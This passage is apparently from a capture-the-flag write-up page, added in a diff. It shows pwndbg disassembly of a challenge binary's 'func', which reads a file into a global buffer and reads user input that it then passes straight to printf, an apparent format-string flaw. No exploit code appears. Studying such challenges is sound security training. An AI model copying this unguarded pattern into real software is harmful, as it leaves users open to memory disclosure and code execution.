+<span id="cb4-60"><a href="#cb4-60" aria-hidden="true" tabindex="-1"></a>End of assembler dump<span class="op">.</span></span>
+<span id="cb4-61"><a href="#cb4-61" aria-hidden="true" tabindex="-1"></a>pwndbg<span class="op">&gt;</span></span></code></pre></div>
+<p><code>func</code> function being called:</p>
+<div class="sourceCode" id="cb5"><pre class="sourceCode nasm"><code class="sourceCode nasm"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a>   0x0000000000401812 &lt;+259&gt;:	<span class="cf">call</span>   <span class="bn">0x4014c0</span> <span class="op">&lt;</span>func<span class="op">&gt;</span></span></code></pre></div>
+<h3 id="diass-func"><a href="#diass-func" class="anchor">#</a>diass func</h3>
+<div class="sourceCode" id="cb6"><pre class="sourceCode nasm"><code class="sourceCode nasm"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a>Dump of assembler code for function func<span class="op">:</span></span>
+<span id="cb6-2"><a href="#cb6-2" aria-hidden="true" tabindex="-1"></a>   0x00000000004014c0 &lt;+0&gt;:	<span class="kw">endbr64</span></span>
+<span id="cb6-3"><a href="#cb6-3" aria-hidden="true" tabindex="-1"></a>   0x00000000004014c4 &lt;+4&gt;:	<span class="kw">push</span>   <span class="kw">rbp</span></span>
+<span id="cb6-4"><a href="#cb6-4" aria-hidden="true" tabindex="-1"></a>   0x00000000004014c5 &lt;+5&gt;:	<span class="kw">mov</span>    <span class="kw">rbp</span><span class="op">,</span><span class="kw">rsp</span></span>
+<span id="cb6-5"><a href="#cb6-5" aria-hidden="true" tabindex="-1"></a>   0x00000000004014c8 &lt;+8&gt;:	<span class="kw">sub</span>    <span class="kw">rsp</span><span class="op">,</span><span class="bn">0x200</span></span>
+<span id="cb6-6"><a href="#cb6-6" aria-hidden="true" tabindex="-1"></a>   0x00000000004014cf &lt;+15&gt;:	<span class="kw">mov</span>    <span class="kw">rax</span><span class="op">,</span><span class="dt">QWORD</span> <span class="dt">PTR</span> <span class="kw">fs</span><span class="op">:</span><span class="bn">0x28</span></span>
+<span id="cb6-7"><a href="#cb6-7" aria-hidden="true" tabindex="-1"></a>   0x00000000004014d8 &lt;+24&gt;:	<span class="kw">mov</span>    <span class="dt">QWORD</span> <span class="dt">PTR</span> <span class="op">[</span><span class="kw">rbp</span><span class="op">-</span><span class="bn">0x8</span><span class="op">],</span><span class="kw">rax</span></span>
+<span id="cb6-8"><a href="#cb6-8" aria-hidden="true" tabindex="-1"></a>   0x00000000004014dc &lt;+28&gt;:	<span class="kw">xor</span>    <span class="kw">eax</span><span class="op">,</span><span class="kw">eax</span></span>
+<span id="cb6-9"><a href="#cb6-9" aria-hidden="true" tabindex="-1"></a>   0x00000000004014de &lt;+30&gt;:	<span class="kw">mov</span>    <span class="kw">rax</span><span class="op">,</span><span class="kw">rsp</span></span>
+<span id="cb6-10"><a href="#cb6-10" aria-hidden="true" tabindex="-1"></a>   0x00000000004014e1 &lt;+33&gt;:	<span class="kw">mov</span>    <span class="dt">QWORD</span> <span class="dt">PTR</span> <span class="op">[</span><span class="kw">rip</span><span class="op">+</span><span class="bn">0x2cf0</span><span class="op">],</span><span class="kw">rax</span>        # <span class="bn">0x4041d8</span> <span class="op">&lt;</span>sp_<span class="op">&gt;</span></span>
+<span id="cb6-11"><a href="#cb6-11" aria-hidden="true" tabindex="-1"></a>   0x00000000004014e8 &lt;+40&gt;:	<span class="kw">mov</span>    <span class="kw">rax</span><span class="op">,</span><span class="kw">rbp</span></span>
+<span id="cb6-12"><a href="#cb6-12" aria-hidden="true" tabindex="-1"></a>   0x00000000004014eb &lt;+43&gt;:	<span class="kw">mov</span>    <span class="dt">QWORD</span> <span class="dt">PTR</span> <span class="op">[</span><span class="kw">rip</span><span class="op">+</span><span class="bn">0x2bde</span><span class="op">],</span><span class="kw">rax</span>        # <span class="bn">0x4040d0</span> <span class="op">&lt;</span>bp_<span class="op">&gt;</span></span>
+<span id="cb6-13"><a href="#cb6-13" aria-hidden="true" tabindex="-1"></a>   0x00000000004014f2 &lt;+50&gt;:	<span class="kw">mov</span>    <span class="kw">rdx</span><span class="op">,</span><span class="dt">QWORD</span> <span class="dt">PTR</span> <span class="op">[</span><span class="kw">rip</span><span class="op">+</span><span class="bn">0x2bd7</span><span class="op">]</span>        # <span class="bn">0x4040d0</span> <span class="op">&lt;</span>bp_<span class="op">&gt;</span></span>
+<span id="cb6-14"><a href="#cb6-14" aria-hidden="true" tabindex="-1"></a>   0x00000000004014f9 &lt;+57&gt;:	<span class="kw">mov</span>    <span class="kw">rax</span><span class="op">,</span><span class="dt">QWORD</span> <span class="dt">PTR</span> <span class="op">[</span><span class="kw">rip</span><span class="op">+</span><span class="bn">0x2cd8</span><span class="op">]</span>        # <span class="bn">0x4041d8</span> <span class="op">&lt;</span>sp_<span class="op">&gt;</span></span>
+<span id="cb6-15"><a href="#cb6-15" aria-hidden="true" tabindex="-1"></a>   0x0000000000401500 &lt;+64&gt;:	<span class="kw">sub</span>    <span class="kw">rdx</span><span class="op">,</span><span class="kw">rax</span></span>
+<span id="cb6-16"><a href="#cb6-16" aria-hidden="true" tabindex="-1"></a>   0x0000000000401503 &lt;+67&gt;:	<span class="kw">mov</span>    <span class="kw">rax</span><span class="op">,</span><span class="kw">rdx</span></span>
+<span id="cb6-17"><a href="#cb6-17" aria-hidden="true" tabindex="-1"></a>   0x0000000000401506 &lt;+70&gt;:	<span class="kw">shr</span>    <span class="kw">rax</span><span class="op">,</span><span class="bn">0x3</span></span>
+<span id="cb6-18"><a href="#cb6-18" aria-hidden="true" tabindex="-1"></a>   0x000000000040150a &lt;+74&gt;:	<span class="kw">add</span>    <span class="kw">rax</span><span class="op">,</span><span class="bn">0x2</span></span>
+<span id="cb6-19"><a href="#cb6-19" aria-hidden="true" tabindex="-1"></a>   0x000000000040150e &lt;+78&gt;:	<span class="kw">mov</span>    <span class="dt">QWORD</span> <span class="dt">PTR</span> <span class="op">[</span><span class="kw">rip</span><span class="op">+</span><span class="bn">0x2cb3</span><span class="op">],</span><span class="kw">rax</span>        # <span class="bn">0x4041c8</span> <span class="op">&lt;</span>sz_<span class="op">&gt;</span></span>
+<span id="cb6-20"><a href="#cb6-20" aria-hidden="true" tabindex="-1"></a>   0x0000000000401515 &lt;+85&gt;:	<span class="kw">mov</span>    <span class="kw">rax</span><span class="op">,</span><span class="dt">QWORD</span> <span class="dt">PTR</span> <span class="op">[</span><span class="kw">rip</span><span class="op">+</span><span class="bn">0x2bb4</span><span class="op">]</span>        # <span class="bn">0x4040d0</span> <span class="op">&lt;</span>bp_<span class="op">&gt;</span></span>
+<span id="cb6-21"><a href="#cb6-21" aria-hidden="true" tabindex="-1"></a>   0x000000000040151c &lt;+92&gt;:	<span class="kw">add</span>    <span class="kw">rax</span><span class="op">,</span><span class="bn">0x8</span></span>
+<span id="cb6-22"><a href="#cb6-22" aria-hidden="true" tabindex="-1"></a>   0x0000000000401520 &lt;+96&gt;:	<span class="kw">mov</span>    <span class="dt">QWORD</span> <span class="dt">PTR</span> <span class="op">[</span><span class="kw">rip</span><span class="op">+</span><span class="bn">0x2ca9</span><span class="op">],</span><span class="kw">rax</span>        # <span class="bn">0x4041d0</span> <span class="op">&lt;</span>rp_<span class="op">&gt;</span></span>
+<span id="cb6-23"><a href="#cb6-23" aria-hidden="true" tabindex="-1"></a>   0x0000000000401527 &lt;+103&gt;:	<span class="kw">lea</span>    <span class="kw">rdx</span><span class="op">,[</span><span class="kw">rbp</span><span class="op">-</span><span class="bn">0x200</span><span class="op">]</span></span>
+<span id="cb6-24"><a href="#cb6-24" aria-hidden="true" tabindex="-1"></a>   0x000000000040152e &lt;+110&gt;:	<span class="kw">mov</span>    <span class="kw">eax</span><span class="op">,</span><span class="bn">0x0</span></span>
+<span id="cb6-25"><a href="#cb6-25" aria-hidden="true" tabindex="-1"></a>   0x0000000000401533 &lt;+115&gt;:	<span class="kw">mov</span>    <span class="kw">ecx</span><span class="op">,</span><span class="bn">0x3e</span></span>
+<span id="cb6-26"><a href="#cb6-26" aria-hidden="true" tabindex="-1"></a>   0x0000000000401538 &lt;+120&gt;:	<span class="kw">mov</span>    <span class="kw">rdi</span><span class="op">,</span><span class="kw">rdx</span></span>
+<span id="cb6-27"><a href="#cb6-27" aria-hidden="true" tabindex="-1"></a>   0x000000000040153b &lt;+123&gt;:	<span class="kw">rep</span> stos <span class="dt">QWORD</span> <span class="dt">PTR</span> <span class="kw">es</span><span class="op">:[</span><span class="kw">rdi</span><span class="op">],</span><span class="kw">rax</span></span>
+<span id="cb6-28"><a href="#cb6-28" aria-hidden="true" tabindex="-1"></a>   0x000000000040153e &lt;+126&gt;:	<span class="kw">mov</span>    <span class="kw">edi</span><span class="op">,</span><span class="bn">0x0</span></span>
+<span id="cb6-29"><a href="#cb6-29" aria-hidden="true" tabindex="-1"></a>   0x0000000000401543 &lt;+131&gt;:	<span class="cf">call</span>   <span class="bn">0x401160</span> <span class="op">&lt;</span>time@plt<span class="op">&gt;</span></span>
+<span id="cb6-30"><a href="#cb6-30" aria-hidden="true" tabindex="-1"></a>   0x0000000000401548 &lt;+136&gt;:	<span class="kw">mov</span>    <span class="kw">edi</span><span class="op">,</span><span class="kw">eax</span></span>
+<span id="cb6-31"><a href="#cb6-31" aria-hidden="true" tabindex="-1"></a>   0x000000000040154a &lt;+138&gt;:	<span class="cf">call</span>   <span class="bn">0x401150</span> <span class="op">&lt;</span>srand@plt<span class="op">&gt;</span></span>
+<span id="cb6-32"><a href="#cb6-32" aria-hidden="true" tabindex="-1"></a>   0x000000000040154f &lt;+143&gt;:	<span class="kw">lea</span>    <span class="kw">rdi</span><span class="op">,[</span><span class="kw">rip</span><span class="op">+</span><span class="bn">0xb9a</span><span class="op">]</span>        # <span class="bn">0x4020f0</span></span>
+<span id="cb6-33"><a href="#cb6-33" aria-hidden="true" tabindex="-1"></a>   0x0000000000401556 &lt;+150&gt;:	<span class="cf">call</span>   <span class="bn">0x4010f0</span> <span class="op">&lt;</span>puts@plt<span class="op">&gt;</span></span>
+<span id="cb6-34"><a href="#cb6-34" aria-hidden="true" tabindex="-1"></a>   0x000000000040155b &lt;+155&gt;:	<span class="kw">mov</span>    <span class="kw">esi</span><span class="op">,</span><span class="bn">0x0</span></span>
+<span id="cb6-35"><a href="#cb6-35" aria-hidden="true" tabindex="-1"></a>   0x0000000000401560 &lt;+160&gt;:	<span class="kw">lea</span>    <span class="kw">rdi</span><span class="op">,[</span><span class="kw">rip</span><span class="op">+</span><span class="bn">0xbd7</span><span class="op">]</span>        # <span class="bn">0x40213e</span></span>
+<span id="cb6-36"><a href="#cb6-36" aria-hidden="true" tabindex="-1"></a>   0x0000000000401567 &lt;+167&gt;:	<span class="kw">mov</span>    <span class="kw">eax</span><span class="op">,</span><span class="bn">0x0</span></span>
+<span id="cb6-37"><a href="#cb6-37" aria-hidden="true" tabindex="-1"></a>   0x000000000040156c &lt;+172&gt;:	<span class="cf">call</span>   <span class="bn">0x401180</span> <span class="op">&lt;</span>open@plt<span class="op">&gt;</span></span>
+<span id="cb6-38"><a href="#cb6-38" aria-hidden="true" tabindex="-1"></a>   0x0000000000401571 &lt;+177&gt;:	<span class="kw">mov</span>    <span class="kw">edx</span><span class="op">,</span><span class="bn">0x80</span></span>
+<span id="cb6-39"><a href="#cb6-39" aria-hidden="true" tabindex="-1"></a>   0x0000000000401576 &lt;+182&gt;:	<span class="kw">lea</span>    <span class="kw">rsi</span><span class="op">,[</span><span class="kw">rip</span><span class="op">+</span><span class="bn">0x2bc3</span><span class="op">]</span>        # <span class="bn">0x404140</span> <span class="op">&lt;</span><span class="kw">global</span><span class="op">+</span><span class="dv">96</span><span class="op">&gt;</span></span>
+<span id="cb6-40"><a href="#cb6-40" aria-hidden="true" tabindex="-1"></a>   0x000000000040157d &lt;+189&gt;:	<span class="kw">mov</span>    <span class="kw">edi</span><span class="op">,</span><span class="kw">eax</span></span>
+<span id="cb6-41"><a href="#cb6-41" aria-hidden="true" tabindex="-1"></a>   0x000000000040157f &lt;+191&gt;:	<span class="cf">call</span>   <span class="bn">0x401140</span> <span class="op">&lt;</span>read@plt<span class="op">&gt;</span></span>
+<span id="cb6-42"><a href="#cb6-42" aria-hidden="true" tabindex="-1"></a>   0x0000000000401584 &lt;+196&gt;:	<span class="kw">mov</span>    <span class="kw">edi</span><span class="op">,</span><span class="bn">0xa</span></span>
+<span id="cb6-43"><a href="#cb6-43" aria-hidden="true" tabindex="-1"></a>   0x0000000000401589 &lt;+201&gt;:	<span class="cf">call</span>   <span class="bn">0x4010e0</span> <span class="op">&lt;</span>putchar@plt<span class="op">&gt;</span></span>
+<span id="cb6-44"><a href="#cb6-44" aria-hidden="true" tabindex="-1"></a>   0x000000000040158e &lt;+206&gt;:	<span class="kw">lea</span>    <span class="kw">rdi</span><span class="op">,[</span><span class="kw">rip</span><span class="op">+</span><span class="bn">0xbb3</span><span class="op">]</span>        # <span class="bn">0x402148</span></span>
+<span id="cb6-45"><a href="#cb6-45" aria-hidden="true" tabindex="-1"></a>   0x0000000000401595 &lt;+213&gt;:	<span class="cf">call</span>   <span class="bn">0x4010f0</span> <span class="op">&lt;</span>puts@plt<span class="op">&gt;</span></span>
+<span id="cb6-46"><a href="#cb6-46" aria-hidden="true" tabindex="-1"></a>   0x000000000040159a &lt;+218&gt;:	<span class="kw">lea</span>    <span class="kw">rdi</span><span class="op">,[</span><span class="kw">rip</span><span class="op">+</span><span class="bn">0xbe7</span><span class="op">]</span>        # <span class="bn">0x402188</span></span>
+<span id="cb6-47"><a href="#cb6-47" aria-hidden="true" tabindex="-1"></a>   0x00000000004015a1 &lt;+225&gt;:	<span class="kw">mov</span>    <span class="kw">eax</span><span class="op">,</span><span class="bn">0x0</span></span>
+<span id="cb6-48"><a href="#cb6-48" aria-hidden="true" tabindex="-1"></a>   0x00000000004015a6 &lt;+230&gt;:	<span class="cf">call</span>   <span class="bn">0x401120</span> <span class="op">&lt;</span>printf@plt<span class="op">&gt;</span></span>
+<span id="cb6-49"><a href="#cb6-49" aria-hidden="true" tabindex="-1"></a>   0x00000000004015ab &lt;+235&gt;:	<span class="kw">lea</span>    <span class="kw">rdi</span><span class="op">,[</span><span class="kw">rip</span><span class="op">+</span><span class="bn">0xc2e</span><span class="op">]</span>        # <span class="bn">0x4021e0</span></span>
+<span id="cb6-50"><a href="#cb6-50" aria-hidden="true" tabindex="-1"></a>   0x00000000004015b2 &lt;+242&gt;:	<span class="cf">call</span>   <span class="bn">0x4010f0</span> <span class="op">&lt;</span>puts@plt<span class="op">&gt;</span></span>
+<span id="cb6-51"><a href="#cb6-51" aria-hidden="true" tabindex="-1"></a>   0x00000000004015b7 &lt;+247&gt;:	<span class="kw">lea</span>    <span class="kw">rdi</span><span class="op">,[</span><span class="kw">rip</span><span class="op">+</span><span class="bn">0xc78</span><span class="op">]</span>        # <span class="bn">0x402236</span></span>
+<span id="cb6-52"><a href="#cb6-52" aria-hidden="true" tabindex="-1"></a>   0x00000000004015be &lt;+254&gt;:	<span class="cf">call</span>   <span class="bn">0x4010f0</span> <span class="op">&lt;</span>puts@plt<span class="op">&gt;</span></span>
+<span id="cb6-53"><a href="#cb6-53" aria-hidden="true" tabindex="-1"></a>   0x00000000004015c3 &lt;+259&gt;:	<span class="kw">mov</span>    <span class="kw">edi</span><span class="op">,</span><span class="bn">0xa</span></span>
+<span id="cb6-54"><a href="#cb6-54" aria-hidden="true" tabindex="-1"></a>   0x00000000004015c8 &lt;+264&gt;:	<span class="cf">call</span>   <span class="bn">0x4010e0</span> <span class="op">&lt;</span>putchar@plt<span class="op">&gt;</span></span>
+<span id="cb6-55"><a href="#cb6-55" aria-hidden="true" tabindex="-1"></a>   0x00000000004015cd &lt;+269&gt;:	<span class="kw">lea</span>    <span class="kw">rdi</span><span class="op">,[</span><span class="kw">rip</span><span class="op">+</span><span class="bn">0xc7c</span><span class="op">]</span>        # <span class="bn">0x402250</span></span>
+<span id="cb6-56"><a href="#cb6-56" aria-hidden="true" tabindex="-1"></a>   0x00000000004015d4 &lt;+276&gt;:	<span class="cf">call</span>   <span class="bn">0x4010f0</span> <span class="op">&lt;</span>puts@plt<span class="op">&gt;</span></span>
+<span id="cb6-57"><a href="#cb6-57" aria-hidden="true" tabindex="-1"></a>   0x00000000004015d9 &lt;+281&gt;:	<span class="kw">lea</span>    <span class="kw">rdi</span><span class="op">,[</span><span class="kw">rip</span><span class="op">+</span><span class="bn">0xcd0</span><span class="op">]</span>        # <span class="bn">0x4022b0</span></span>
+<span id="cb6-58"><a href="#cb6-58" aria-hidden="true" tabindex="-1"></a>   0x00000000004015e0 &lt;+288&gt;:	<span class="kw">mov</span>    <span class="kw">eax</span><span class="op">,</span><span class="bn">0x0</span></span>
+<span id="cb6-59"><a href="#cb6-59" aria-hidden="true" tabindex="-1"></a>   0x00000000004015e5 &lt;+293&gt;:	<span class="cf">call</span>   <span class="bn">0x401120</span> <span class="op">&lt;</span>printf@plt<span class="op">&gt;</span></span>
+<span id="cb6-60"><a href="#cb6-60" aria-hidden="true" tabindex="-1"></a>   0x00000000004015ea &lt;+298&gt;:	<span class="kw">lea</span>    <span class="kw">rdi</span><span class="op">,[</span><span class="kw">rip</span><span class="op">+</span><span class="bn">0xd27</span><span class="op">]</span>        # <span class="bn">0x402318</span></span>
+<span id="cb6-61"><a href="#cb6-61" aria-hidden="true" tabindex="-1"></a>   0x00000000004015f1 &lt;+305&gt;:	<span class="kw">mov</span>    <span class="kw">eax</span><span class="op">,</span><span class="bn">0x0</span></span>
+<span id="cb6-62"><a href="#cb6-62" aria-hidden="true" tabindex="-1"></a>   0x00000000004015f6 &lt;+310&gt;:	<span class="cf">call</span>   <span class="bn">0x401120</span> <span class="op">&lt;</span>printf@plt<span class="op">&gt;</span></span>
+<span id="cb6-63"><a href="#cb6-63" aria-hidden="true" tabindex="-1"></a>   0x00000000004015fb &lt;+315&gt;:	<span class="kw">lea</span>    <span class="kw">rdi</span><span class="op">,[</span><span class="kw">rip</span><span class="op">+</span><span class="bn">0xd78</span><span class="op">]</span>        # <span class="bn">0x40237a</span></span>
+<span id="cb6-64"><a href="#cb6-64" aria-hidden="true" tabindex="-1"></a>   0x0000000000401602 &lt;+322&gt;:	<span class="cf">call</span>   <span class="bn">0x4010f0</span> <span class="op">&lt;</span>puts@plt<span class="op">&gt;</span></span>
+<span id="cb6-65"><a href="#cb6-65" aria-hidden="true" tabindex="-1"></a>   0x0000000000401607 &lt;+327&gt;:	<span class="kw">mov</span>    <span class="kw">edi</span><span class="op">,</span><span class="bn">0xa</span></span>
+<span id="cb6-66"><a href="#cb6-66" aria-hidden="true" tabindex="-1"></a>   0x000000000040160c &lt;+332&gt;:	<span class="cf">call</span>   <span class="bn">0x4010e0</span> <span class="op">&lt;</span>putchar@plt<span class="op">&gt;</span></span>
+<span id="cb6-67"><a href="#cb6-67" aria-hidden="true" tabindex="-1"></a>   0x0000000000401611 &lt;+337&gt;:	<span class="kw">lea</span>    <span class="kw">rsi</span><span class="op">,[</span><span class="kw">rip</span><span class="op">+</span><span class="bn">0x2b28</span><span class="op">]</span>        # <span class="bn">0x404140</span> <span class="op">&lt;</span><span class="kw">global</span><span class="op">+</span><span class="dv">96</span><span class="op">&gt;</span></span>
+<span id="cb6-68"><a href="#cb6-68" aria-hidden="true" tabindex="-1"></a>   0x0000000000401618 &lt;+344&gt;:	<span class="kw">lea</span>    <span class="kw">rdi</span><span class="op">,[</span><span class="kw">rip</span><span class="op">+</span><span class="bn">0xd69</span><span class="op">]</span>        # <span class="bn">0x402388</span></span>
+<span id="cb6-69"><a href="#cb6-69" aria-hidden="true" tabindex="-1"></a>   0x000000000040161f &lt;+351&gt;:	<span class="kw">mov</span>    <span class="kw">eax</span><span class="op">,</span><span class="bn">0x0</span></span>
+<span id="cb6-70"><a href="#cb6-70" aria-hidden="true" tabindex="-1"></a>   0x0000000000401624 &lt;+356&gt;:	<span class="cf">call</span>   <span class="bn">0x401120</span> <span class="op">&lt;</span>printf@plt<span class="op">&gt;</span></span>
+<span id="cb6-71"><a href="#cb6-71" aria-hidden="true" tabindex="-1"></a>   0x0000000000401629 &lt;+361&gt;:	<span class="kw">lea</span>    <span class="kw">rdi</span><span class="op">,[</span><span class="kw">rip</span><span class="op">+</span><span class="bn">0xdb8</span><span class="op">]</span>        # <span class="bn">0x4023e8</span></span>
+<span id="cb6-72"><a href="#cb6-72" aria-hidden="true" tabindex="-1"></a>   0x0000000000401630 &lt;+368&gt;:	<span class="kw">mov</span>    <span class="kw">eax</span><span class="op">,</span><span class="bn">0x0</span></span>
+<span id="cb6-73"><a href="#cb6-73" aria-hidden="true" tabindex="-1"></a>   0x0000000000401635 &lt;+373&gt;:	<span class="cf">call</span>   <span class="bn">0x401120</span> <span class="op">&lt;</span>printf@plt<span class="op">&gt;</span></span>
+<span id="cb6-74"><a href="#cb6-74" aria-hidden="true" tabindex="-1"></a>   0x000000000040163a &lt;+378&gt;:	<span class="kw">lea</span>    <span class="kw">rdi</span><span class="op">,[</span><span class="kw">rip</span><span class="op">+</span><span class="bn">0xe04</span><span class="op">]</span>        # <span class="bn">0x402445</span></span>
+<span id="cb6-75"><a href="#cb6-75" aria-hidden="true" tabindex="-1"></a>   0x0000000000401641 &lt;+385&gt;:	<span class="cf">call</span>   <span class="bn">0x4010f0</span> <span class="op">&lt;</span>puts@plt<span class="op">&gt;</span></span>
+<span id="cb6-76"><a href="#cb6-76" aria-hidden="true" tabindex="-1"></a>   0x0000000000401646 &lt;+390&gt;:	<span class="kw">mov</span>    <span class="kw">esi</span><span class="op">,</span><span class="bn">0x100</span></span>
+<span id="cb6-77"><a href="#cb6-77" aria-hidden="true" tabindex="-1"></a>   0x000000000040164b &lt;+395&gt;:	<span class="kw">lea</span>    <span class="kw">rdi</span><span class="op">,[</span><span class="kw">rip</span><span class="op">+</span><span class="bn">0xe0e</span><span class="op">]</span>        # <span class="bn">0x402460</span></span>
+<span id="cb6-78"><a href="#cb6-78" aria-hidden="true" tabindex="-1"></a>   0x0000000000401652 &lt;+402&gt;:	<span class="kw">mov</span>    <span class="kw">eax</span><span class="op">,</span><span class="bn">0x0</span></span>
+<span id="cb6-79"><a href="#cb6-79" aria-hidden="true" tabindex="-1"></a>   0x0000000000401657 &lt;+407&gt;:	<span class="cf">call</span>   <span class="bn">0x401120</span> <span class="op">&lt;</span>printf@plt<span class="op">&gt;</span></span>
+<span id="cb6-80"><a href="#cb6-80" aria-hidden="true" tabindex="-1"></a>   0x000000000040165c &lt;+412&gt;:	<span class="kw">lea</span>    <span class="kw">rax</span><span class="op">,[</span><span class="kw">rbp</span><span class="op">-</span><span class="bn">0x200</span><span class="op">]</span></span>
+<span id="cb6-81"><a href="#cb6-81" aria-hidden="true" tabindex="-1"></a>   0x0000000000401663 &lt;+419&gt;:	<span class="kw">add</span>    <span class="kw">rax</span><span class="op">,</span><span class="bn">0xa4</span></span>
+<span id="cb6-82"><a href="#cb6-82" aria-hidden="true" tabindex="-1"></a>   0x0000000000401669 &lt;+425&gt;:	<span class="kw">mov</span>    <span class="kw">edx</span><span class="op">,</span><span class="bn">0x100</span></span>
+<span id="cb6-83"><a href="#cb6-83" aria-hidden="true" tabindex="-1"></a>   0x000000000040166e &lt;+430&gt;:	<span class="kw">mov</span>    <span class="kw">rsi</span><span class="op">,</span><span class="kw">rax</span></span>
+<span id="cb6-84"><a href="#cb6-84" aria-hidden="true" tabindex="-1"></a>   0x0000000000401671 &lt;+433&gt;:	<span class="kw">mov</span>    <span class="kw">edi</span><span class="op">,</span><span class="bn">0x0</span></span>
+<span id="cb6-85"><a href="#cb6-85" aria-hidden="true" tabindex="-1"></a>   0x0000000000401676 &lt;+438&gt;:	<span class="cf">call</span>   <span class="bn">0x401140</span> <span class="op">&lt;</span>read@plt<span class="op">&gt;</span></span>
+<span id="cb6-86"><a href="#cb6-86" aria-hidden="true" tabindex="-1"></a>   0x000000000040167b &lt;+443&gt;:	<span class="kw">mov</span>    <span class="dt">DWORD</span> <span class="dt">PTR</span> <span class="op">[</span><span class="kw">rbp</span><span class="op">-</span><span class="bn">0x19c</span><span class="op">],</span><span class="kw">eax</span></span>
+<span id="cb6-87"><a href="#cb6-87" aria-hidden="true" tabindex="-1"></a>   0x0000000000401681 &lt;+449&gt;:	<span class="kw">mov</span>    <span class="kw">eax</span><span class="op">,</span><span class="dt">DWORD</span> <span class="dt">PTR</span> <span class="op">[</span><span class="kw">rbp</span><span class="op">-</span><span class="bn">0x19c</span><span class="op">]</span></span>
+<span id="cb6-88"><a href="#cb6-88" aria-hidden="true" tabindex="-1"></a>   0x0000000000401687 &lt;+455&gt;:	<span class="kw">cdqe</span></span>
+<span id="cb6-89"><a href="#cb6-89" aria-hidden="true" tabindex="-1"></a>   0x0000000000401689 &lt;+457&gt;:	<span class="kw">mov</span>    <span class="dt">BYTE</span> <span class="dt">PTR</span> <span class="op">[</span><span class="kw">rbp</span><span class="op">+</span><span class="kw">rax</span><span class="op">*</span><span class="dv">1</span><span class="op">-</span><span class="bn">0x15c</span><span class="op">],</span><span class="bn">0x0</span></span>
+<span id="cb6-90"><a href="#cb6-90" aria-hidden="true" tabindex="-1"></a>   0x0000000000401691 &lt;+465&gt;:	<span class="kw">mov</span>    <span class="kw">eax</span><span class="op">,</span><span class="dt">DWORD</span> <span class="dt">PTR</span> <span class="op">[</span><span class="kw">rbp</span><span class="op">-</span><span class="bn">0x19c</span><span class="op">]</span></span>
+<span id="cb6-91"><a href="#cb6-91" aria-hidden="true" tabindex="-1"></a>   0x0000000000401697 &lt;+471&gt;:	<span class="kw">mov</span>    <span class="kw">esi</span><span class="op">,</span><span class="kw">eax</span></span>
+<span id="cb6-92"><a href="#cb6-92" aria-hidden="true" tabindex="-1"></a>   0x0000000000401699 &lt;+473&gt;:	<span class="kw">lea</span>    <span class="kw">rdi</span><span class="op">,[</span><span class="kw">rip</span><span class="op">+</span><span class="bn">0xdf1</span><span class="op">]</span>        # <span class="bn">0x402491</span></span>
+<span id="cb6-93"><a href="#cb6-93" aria-hidden="true" tabindex="-1"></a>   0x00000000004016a0 &lt;+480&gt;:	<span class="kw">mov</span>    <span class="kw">eax</span><span class="op">,</span><span class="bn">0x0</span></span>
+<span id="cb6-94"><a href="#cb6-94" aria-hidden="true" tabindex="-1"></a>   0x00000000004016a5 &lt;+485&gt;:	<span class="cf">call</span>   <span class="bn">0x401120</span> <span class="op">&lt;</span>printf@plt<span class="op">&gt;</span></span>
+<span id="cb6-95"><a href="#cb6-95" aria-hidden="true" tabindex="-1"></a>   0x00000000004016aa &lt;+490&gt;:	<span class="kw">mov</span>    <span class="kw">edi</span><span class="op">,</span><span class="bn">0xa</span></span>
+<span id="cb6-96"><a href="#cb6-96" aria-hidden="true" tabindex="-1"></a>   0x00000000004016af &lt;+495&gt;:	<span class="cf">call</span>   <span class="bn">0x4010e0</span> <span class="op">&lt;</span>putchar@plt<span class="op">&gt;</span></span>
+<span id="cb6-97"><a href="#cb6-97" aria-hidden="true" tabindex="-1"></a>   0x00000000004016b4 &lt;+500&gt;:	<span class="kw">mov</span>    <span class="kw">esi</span><span class="op">,</span><span class="bn">0x100</span></span>
+<span id="cb6-98"><a href="#cb6-98" aria-hidden="true" tabindex="-1"></a>   0x00000000004016b9 &lt;+505&gt;:	<span class="kw">lea</span>    <span class="kw">rdi</span><span class="op">,[</span><span class="kw">rip</span><span class="op">+</span><span class="bn">0xde8</span><span class="op">]</span>        # <span class="bn">0x4024a8</span></span>
+<span id="cb6-99"><a href="#cb6-99" aria-hidden="true" tabindex="-1"></a>   0x00000000004016c0 &lt;+512&gt;:	<span class="kw">mov</span>    <span class="kw">eax</span><span class="op">,</span><span class="bn">0x0</span></span>
+<span id="cb6-100"><a href="#cb6-100" aria-hidden="true" tabindex="-1"></a>   0x00000000004016c5 &lt;+517&gt;:	<span class="cf">call</span>   <span class="bn">0x401120</span> <span class="op">&lt;</span>printf@plt<span class="op">&gt;</span></span>
+<span id="cb6-101"><a href="#cb6-101" aria-hidden="true" tabindex="-1"></a>   0x00000000004016ca &lt;+522&gt;:	<span class="kw">mov</span>    <span class="kw">edi</span><span class="op">,</span><span class="bn">0xa</span></span>
+<span id="cb6-102"><a href="#cb6-102" aria-hidden="true" tabindex="-1"></a>   0x00000000004016cf &lt;+527&gt;:	<span class="cf">call</span>   <span class="bn">0x4010e0</span> <span class="op">&lt;</span>putchar@plt<span class="op">&gt;</span></span>
+<span id="cb6-103"><a href="#cb6-103" aria-hidden="true" tabindex="-1"></a>   0x00000000004016d4 &lt;+532&gt;:	<span class="kw">lea</span>    <span class="kw">rax</span><span class="op">,[</span><span class="kw">rbp</span><span class="op">-</span><span class="bn">0x200</span><span class="op">]</span></span>
+<span id="cb6-104"><a href="#cb6-104" aria-hidden="true" tabindex="-1"></a>   0x00000000004016db &lt;+539&gt;:	<span class="kw">add</span>    <span class="kw">rax</span><span class="op">,</span><span class="bn">0xa4</span></span>
+<span id="cb6-105"><a href="#cb6-105" aria-hidden="true" tabindex="-1"></a>   0x00000000004016e1 &lt;+545&gt;:	<span class="kw">mov</span>    <span class="kw">rdi</span><span class="op">,</span><span class="kw">rax</span></span>
+<span id="cb6-106"><a href="#cb6-106" aria-hidden="true" tabindex="-1"></a>   0x00000000004016e4 &lt;+548&gt;:	<span class="kw">mov</span>    <span class="kw">eax</span><span class="op">,</span><span class="bn">0x0</span></span>
+<span id="cb6-107"><a href="#cb6-107" aria-hidden="true" tabindex="-1"></a>   0x00000000004016e9 &lt;+553&gt;:	<span class="cf">call</span>   <span class="bn">0x401120</span> <span class="op">&lt;</span>printf@plt<span class="op">&gt;</span></span>
